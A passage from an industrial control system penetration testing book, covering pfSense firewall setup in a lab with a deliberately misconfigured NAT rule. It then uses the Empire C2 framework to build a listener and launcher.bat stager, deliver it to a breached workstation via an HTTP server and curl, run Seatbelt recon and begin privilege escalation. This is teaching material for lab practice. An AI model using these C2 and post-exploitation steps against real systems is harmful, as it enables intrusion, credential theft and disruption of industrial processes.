- en: '*Chapter 11*: Whoot… I Have To Go Deep'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: After reading the previous chapter, we have a foothold/shell, but now what?
    Next, we need to understand where we have landed and what we have access to. This
    includes gathering as much information as possible, harvesting credentials, mapping
    network connections, using proxies to run internal network scans, and discovering
    pivotable hosts. This is the phase where we need to traverse the inside of the
    system. We can accomplish this by using tools to map the network through proxies
    and go deeper. Depending on the entry point, there will be key information to
    discover, including clues, which will provide details about lower-level systems
    that will be required to get down to the physical I/O.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will be installing a firewall that will allow us to build
    out segmentation in our lab network. After gaining initial access to a network,
    this tends to be where people get stuck and typically ask questions such as, what
    do I do now? How do I gain administrative access? Where do I go next? This chapter
    will help address these questions. We will leverage Empire to build a **Control
    and Command** (**C2**) server, which will allow us to harness credentials, find
    exploitable services, and gain elevated privileges. Next, we will work with port
    forwarding, SSH tunneling, and proxychains to get us further into the network
    and ultimately compromise the industrial process.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we''re going to cover the following main topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Configuring a firewall
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: I have a shell, now what?
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Escalating privileges
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Pivoting
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For this chapter, you will need the following:'
  prefs: []
  type: TYPE_NORMAL
- en: A pfSense firewall, which you can download from [https://www.pfsense.org/download/](https://www.pfsense.org/download/).
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'A Kali Linux VM running with the following tools installed:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '- **Empire**: [https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2](https://github.com/BC-SECURITY/Empire/releases/tag/v3.8.2)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **mimikatz**: [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **Proxychains**: This can be installed by running **sudo apt install proxychains**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **chisel**: [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **Freerdp2**: This can be installed by running **sudo apt install freerdp2-x11
    freerdp2-shadow-x11**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3lAzYVb](https://bit.ly/3lAzYVb)'
  prefs: []
  type: TYPE_NORMAL
- en: Configuring a firewall
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: You are probably wondering why, in every chapter, we are installing or configuring
    something new in the lab. You might be wondering, *why didn't we install this
    earlier in this book?* This isn't a wrong train of thought as we could have simply
    spent the first part of this book installing everything that we needed for the
    lab. However, I feel that it is very important to get into the practice of continually
    building and tearing down your lab. This helps promote adaptability, which is
    a key component of pentesting. Adding elements in every chapter helps reinforce
    the practice of adaptability.
  prefs: []
  type: TYPE_NORMAL
- en: 'Many vendors provide industrial firewalls, with some of the more industry-recognized
    names being Cisco, Fortinet, Checkpoint, Palo Alto, Belden, and Moxa. Each vendor
    comes with a list of pros and cons, techniques, and features, which I will leave
    up to you to investigate further. When it comes to implementing firewalls and
    encountering them during an engagement, you have to be highly adaptive. I have
    seen networks with zero firewalls installed and then on the flip side, I have
    seen networks with micro-segmentation and multi-tiered separation of duties, which
    means that many hands are required to try and build a connection across a corporate
    network. By introducing a firewall to our lab, we will be implementing controlled
    segmentation for our network. In this section, we will be installing and configuring
    the latest version of the pfSense (Community Edition) firewall. Let''s get started:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Navigate to the following link to download the latest version of pfSense. At
    the time of writing, this is version 2.5.1: [https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz](https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.1-RELEASE-amd64.iso.gz).'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Once you have the ISO, make sure that you load it into your datastore and start
    up a new VM. I used the options shown in the following screenshot for the configuration.
    The most important aspect is the network adapters. We will be placing the firewall
    at Level 4 so that it connects **Level 5: Enterprise** to **Level 3: Operations**,
    as shown in the following screenshot:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 11.1 – Firewall configuration'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/B16321_11_001.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.1 – Firewall configuration
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once configured, start up the VM and wait while it performs the initial boot.
    You will be greeted by the **End User License Agreement** (**EULA**). Go ahead
    and click **<Accept>**, as shown in the following screenshot:![Figure 11.2 – EULA
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_002.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.2 – EULA
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After accepting the agreement, you will be presented with three options. Select
    **Install** and start installing pfSense, as shown in the following screenshot:![Figure
    11.3 – Install pfSense option
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_003.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.3 – Install pfSense option
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, you have the option to change the keymap language, depending on your location.
    Pick any language you wish. I will be using the standard **"US"** default option,
    as shown here:![Figure 11.4 – Keymap
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_004.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.4 – Keymap
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After keymapping, we can choose how we would like to partition the disk. I am
    going to use the **Auto (UFS) BIOS** method, as shown in the following screenshot:![Figure
    11.5 – Disk partitioning
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_005.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.5 – Disk partitioning
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the installer finishes running, you have the option to enter the terminal
    and add some tweaks to the firewall before rebooting. I selected **No** to keep
    everything at its defaults:![Figure 11.6 – Final tweaks
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_006.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.6 – Final tweaks
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now, you can reboot your system or enter the shell directly. I chose to reboot
    the system as a habit so that lingering changes aren't fully committed until a
    reboot occurs. Select **Reboot** to continue, as shown in the following screenshot:![Figure
    11.7 – Reboot
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_007.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.7 – Reboot
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the reboot completes, you will be presented with a list of options on the
    console. You should also see a DHCP **wan** that's been provided by your LABCORP
    DNS server, as well as a default **lan** address, as shown in the following screenshot:![Figure
    11.8 – Console menu
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_008.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.8 – Console menu
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We are going to use the default **lan** IP address and open a browser to configure
    the firewall via the web UI. Navigate to the IP address that's been assigned to
    your LAN. In my case, it is **192.168.3.1**. Use **admin** as your username and
    **pfsense** as your password to log into the firewall:![Figure 11.9 – pfSense
    login
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_009.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.9 – pfSense login
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Once logged in, you will see the **pfSense Setup** wizard, as shown in the
    following screenshot:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 11.10 – Setup wizard'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/B16321_11_010.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.10 – Setup wizard
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, we must set up the **General Information** options for **Hostname**, **Domain**,
    and **Primary DNS Server**:![Figure 11.11 – General Information
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_011.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.11 – General Information
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: The next important option to configure will be the WAN interface. Set this to
    **DHCP**, as shown in the following screenshot:![Figure 11.12 – Configure WAN
    Interface
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_012.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.12 – Configure WAN Interface
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We also want to make sure that we don't block any RF1918 networks as we are
    going to be using this firewall internally, as shown here:![Figure 11.13 – RFC1918
    Networks
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_013.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.13 – RFC1918 Networks
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, we want to set the LAN interface. For the subnet that we statically configured
    earlier in this book, we will be setting the address as **192.168.3.1**, as shown
    in the following screenshot:![Figure 11.14 – LAN interface
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_014.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.14 – LAN interface
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: You will have the option to change the default password for the admin interface,
    so go ahead and change it. Next, you will be asked to reload the configuration,
    which will take a minute or so. Once it has reloaded you will have to point your
    browser to **192.168.3.1** to get back to the web interface. Once you log back
    in to the web interface, you will see the dashboard, where you will see **System
    Information**, the **Interfaces** configuration, and **Netgate Services and Support**,
    as shown in the following screenshot:![Figure 11.15 – pfSense dashboard
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_015.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.15 – pfSense dashboard
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We want to set up a DHCP server for our LAN interface. Navigate to **Services**
    | **DHCP Server**, as shown in the following screenshot:![Figure 11.16 – DHCP
    server
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_016.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.16 – DHCP server
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'From here, we are going to set the **General Options** options by setting the
    following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '– **Subnet**: **192.168.3.0**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '– **Subnet mask**: **255.255.255.0**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '– **Available range**: **192.168.3.1 – 192.168.3.254**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '– **Range**: **From** **[192.168.3.100]** – **To** **[192.168.3.199]**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Here is an example for you to follow:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 11.17 – DHCP server'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/B16321_11_017.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.17 – DHCP server
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: From here, we are going to add a *misconfigured* NAT rule to allow traffic from
    the enterprise to communicate with operations and vice versa:![Figure 11.18 –
    NAT selection
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_018.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.18 – NAT selection
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now, we want to select **Port Forward** and add a new rule. You should see an
    empty list:![Figure 11.19 – Port Forward
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_019.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.19 – Port Forward
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Upon clicking the **Add** green button, you will be brought to the **Edit Redirect
    Entry** screen. We are going to leave most of the options as-is, but we must make
    some changes to the source and destination options.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The following are the options that we will want to configure:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '– **Source**: **Type** (**Network**) | **Address** (**172.16.0.0**) | **Mask**
    (**24**)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '– **Destination**: **Type** (**WAN address**)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '– **Destination port range**: **From port** (**Any**) | **To port** (**Any**)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '– **Redirect target IP**: **Type** (**Single host**) | **Address** (**192.168.3.10**)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'See the following screenshot for some guidance:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 11.20 – Port forward/edit'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/B16321_11_020.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.20 – Port forward/edit
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once configured and after providing a **Description**, make sure to click the
    **Save** button at the bottom of the screen. Once saved, you will see a popup
    that allows you to **Apply Changes** to the firewall. Go ahead and apply your
    changes, as shown here:![Figure 11.21 – The Apply Changes button
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_021.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.21 – The Apply Changes button
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Now, you should see the following **Port Forward** rule:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 11.22 – The Port Forward rule'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/B16321_11_022.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.22 – The Port Forward rule
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We want to validate that **Outbound NAT Mode** has been set to **Automatic outbound
    NAT rule generation**, as shown here:![Figure 11.23 – Outbound NAT Mode
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_023.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.23 – Outbound NAT Mode
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Finally, we want to verify that our WAN rules were created by going to **Firewall**
    | **WAN**. You should have a rule that looks like this:![Figure 11.24 – WAN rule
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_024.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.24 – WAN rule
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Now that our firewall has been configured, we want to quickly add the Windows
    7 machine that we used earlier in this book to configure the PLC to the **labcorp.local**
    domain. Let''s get started:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: To do this, we must edit our network interface and update the **Preferred DNS
    server** option, as shown here:![Figure 11.25 – Preferred DNS server
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_025.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.25 – Preferred DNS server
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, navigate to **Computer** | **Properties** | **System Properties** | **Computer
    name**. From here, set **Computer name** to **OS1** for operator station 1\. Then,
    select **Domain** and set it to **labcorp.local**, as shown in the following screenshot:![Figure
    11.26 – Computer Name/Domain Changes
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_026.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.26 – Computer Name/Domain Changes
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now, let's make sure that we are domain-connected and can authenticate with
    a known user. As shown in the following screenshot, we have used **operator1**
    to log into the Windows 7 VM:![Figure 11.27 – Domain-connected
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_027.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.27 – Domain-connected
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We need to make sure that our lab operators can use **Remote Desktop** by adding
    **LABCORP\Domain Users** to **Remote Desktop Users**, as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 11.28 – Domain users as Remote Desktop Users'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_028.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.28 – Domain users as Remote Desktop Users
  prefs: []
  type: TYPE_NORMAL
- en: In this section, we configured a firewall to introduce segmentation between
    the enterprise network and the operations network. We also quickly connected the
    Windows 7 VM that we installed in [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013),
    *Using Virtualization*, to the domain that we created in [*Chapter 10*](B16321_10_Epub_AM.xhtml#_idTextAnchor112),
    *I Can Do It 420*, and made sure that the **LABCORP** users have remote desktop
    access to their operator workstation. In the next section, we will learn how to
    leverage these configurations to discover paths through the network.
  prefs: []
  type: TYPE_NORMAL
- en: I have a shell, now what?
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: It's time to go back to our scheduled broadcast. Once we have gained access,
    watching that shell as it pops up in front of our eyes is exhilarating. However,
    the hard work has yet to come. Next, we need to understand where we have landed
    and what we have access to. For this, we are going to explore a post-exploitation
    framework called **Empire**. Empire is a C2 framework that's used to install PowerShell
    agents that can deliver modules on demand. These modules contain a lot of packages
    that I have come to use over the years, so it is very nice to have them centralized.
    Empire provides modules such as winPEAS, Sherlock, Watson, PowerUp, mimikatz,
    and more. These tools help automate data collection on the system and environment
    that we have landed in and helps us establish a beachhead for our pentesting adventures.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this section, we are going to quickly install Empire, create a listener,
    build a stager, and then deliver modules to our host. Let''s get started:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First, we want to clone this GitHub repository and run the **install** script:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**git clone --recursive https://github.com/BC-SECURITY/Empire.git**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**cd Empire**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**sudo ./setup/install.sh**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the installation has finished, we must run the**./empire** command. Once
    you've done this, you will see a splash page section that shows the total number
    of modules, the number of listeners, and the number of agents currently active
    in the version of the tool that you've installed. In my case, as shown in the
    following screenshot, I have **319** modules available for post-exploitation,
    and **0** listeners and **0** agents running as this is the first time I have
    run Empire before the engagement:![Figure 11.29 – Empire
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_029.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.29 – Empire
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, we want to set up a listener for our soon-to-be deployed agents to report
    back to. In this case, at the **(Empire**) **>** prompt, we can run the **uselistener**
    command, and then add a space and press *Tab* to see the available options that
    we can use. I am going to select **http** in this case for my listener. After
    that, you can type **info** to bring up a list of commands, as shown in the following
    screenshot:![Figure 11.30 – uselistener http
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_030.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.30 – uselistener http
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Here, you can fine-tune your listener. In my case, I only changed the **Name**
    and **Host** options. I set **Host** to my Kali Linux IP address, which is **172.16.0.6**
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, we want to create a stager that can be installed on our *victim* machine.
    We are going to use the **(Empire) > usestager multi/launcher http** command for
    this. This command sets the stager to multi/launcher and attaches it to the listener
    that we created in the previous step. When you type **info**, you will be presented
    with options that you can change and tune for your agent delivery mechanism.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Here, if you simply type **generate**, the default option will be to print
    to the screen. This allows you to copy and paste the shellcode into your victim''s
    system. Or, if you are lazy like I am, you can set the **OutFile** option to have
    Empire generate a **.bat** file that you can pass into your victim. Here is the
    output from running **generate** without setting the file:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 11.31 – Stager shellcode'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/B16321_11_031.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.31 – Stager shellcode
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now, if you want to set the file option so that you can simply copy it to various
    systems that we wish to compromise, use the **set OutFile launcher.bat** command,
    type **info**, and press *Enter*. You will see that the **OutFile** option now
    has **launcher.bat** as a **Value** field, as shown here:![Figure 11.32 – OutFile
    setting
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_032.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.32 – OutFile setting
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'After setting your file type to **generate** and pressing *Enter*, if everything
    is correct, you should get the following output:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 11.33 – generate'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/B16321_11_033.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.33 – generate
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now, we are going to upload our newly created **launcher.bat** file to the workstation
    machine that we previously breached and run the file. I will leave it up to you
    to get into the workstation – I used Evil-WinRM to create a session with the **operator2**
    credentials we discovered and then created a **python3 -m http.server** to host
    my **launcher.bat** file. Finally, I used **curl** to grab the file and pull it
    into the workstation, as shown here:![Figure 11.34 – launcher.bat on the workstation
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_034.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.34 – launcher.bat on the workstation
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once you've run the file, go back to your **(Empire) >** interface and type
    the **agents** command. This will bring up a list of active agents that are available
    to you, as shown in the following screenshot:![Figure 11.35 – Active agents
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_035.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.35 – Active agents
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: At this point, we have a live agent that is beaconing back to our Empire C2
    platform – this is awesome! The next step is to type **interact <agent name>**.
    In my case, it will be **interact 62FRNKHT**. After connecting, type **info**
    to see what options can be configured. The following is the output I received:![Figure
    11.36 – Interacting with the agent
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_036.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.36 – Interacting with the agent
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Excellent! At this point, we are interacting with our agent. Let''s start taking
    a look at our system and its surroundings. Typing the **usemodule** command and
    pressing *Tab* will bring up a long list of modules that we have access to. There
    are 12 primary categories, and they contain various submodules. Here are the categories:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '- **code_execution**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **collection**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **credentials**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **exfiltration**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **exploitation**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **lateral_movement**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **management**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **persistence**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **privesc**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **recon**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **situational_awareness**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '- **trollsploit**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Take a look at the various categories and what submodules they have to offer.
    As we mentioned earlier, we want to gather some situational awareness. For this,
    we will use the **situational_awareness** category. From here, select **host**
    and the **Seatbelt** module. To find out more about Seatbelt and its extensive
    capabilities, take a look at the following link: [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt).'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Use the **usemodule situational_awareness/host/seatbelt** command once you
    have set your module type to **info** to take a look at the available options.
    Then, **run** the module – you should get the following output:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 11.37 – The Seatbelt module'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_037.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.37 – The Seatbelt module
  prefs: []
  type: TYPE_NORMAL
- en: 'Empire assigns a task ID to the running module, which allows sequencing to
    occur at the agent level. Once the module runs, you will see feedback from the
    agent, and it will be displayed on the screen. As Seatbelt runs, various tests
    will be performed on the workstation and a mass amount of information will be
    harvested, which can easily fill up the visual buffer. You can find an **agent.log**
    that contains the output of tests that have been run by the agent under **Empire/downloads/<agent
    name>/agent.log**. Upon reviewing this log file, you can find interesting information
    about the host system that the agent resides on. You will discover various interfaces
    being utilized, antivirus software, AppLocker, autorun programs, environment variables,
    interesting files, interesting processes, and much more. The following screenshot
    shows a list of users with administrative privileges on workstation 1, which was
    discovered through one of the tests:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.38 – Admin privileges'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_038.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.38 – Admin privileges
  prefs: []
  type: TYPE_NORMAL
- en: 'Another test is discovering current RDP sessions that are present on the host,
    which we can do by reading through the log file with the username set to **lab.da**,
    as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.39 – RDP sessions'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_039.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.39 – RDP sessions
  prefs: []
  type: TYPE_NORMAL
- en: These are simply snippets of the information that has been gleaned from the
    tests that Seatbelt performs. However, as you search through the log file, you
    will find that **Operator2** does not have administrative access, and this proves
    to be an issue when gleaning more detailed information. This moves us nicely to
    the next section, where we will discover how to elevate our privileges to gain
    deeper insights into our victim machine.
  prefs: []
  type: TYPE_NORMAL
- en: Escalating privileges
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Privilege escalation is where an attacker looks to gain access that extends
    beyond the scope of the exploited user''s ability. There are two forms: **horizontal**
    privilege escalation and **vertical** privilege escalation. Horizontal privilege
    escalation is a term that''s used for maintaining a current user''s privileges
    while leveraging flaws in system policies, software, and file settings, which
    allows the current user to access other user resources, files, and services. This
    type of privilege access is commonplace in industrial control systems and in my
    experience, it can be enough to bring systems and processes to a grinding halt.
    Vertical privilege escalation, on the other hand, is the attacker''s journey,
    whereby they move from a less privileged account through to a system admin or
    a domain admin account. Once an attacker has a domain admin account, they can
    wreak havoc inside of the compromised network and infrastructure.'
  prefs: []
  type: TYPE_NORMAL
- en: 'In the previous section, we installed Empire, which allowed us to run post-exploitation
    recon and situational awareness. We are going to leverage the same C2 engine to
    run the **privesc** modules. For this, we are going to install our **launcher.bat**
    file; that is, **operator1**:'
  prefs: []
  type: TYPE_NORMAL
- en: As you may recall from [*Chapter 10*](B16321_10_Epub_AM.xhtml#_idTextAnchor112),
    *I Can Do It 420*, we discovered the NTLM hash of **operator1** NTLM hash and
    we used hashcat to crack it. Once you run **launcher.bat** under **operator1**,
    go back to Empire and look at its list agents. You should now see that two agents
    have been installed, as shown here:![Figure 11.40 – Installing the operator1 agent
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_040.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.40 – Installing the operator1 agent
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
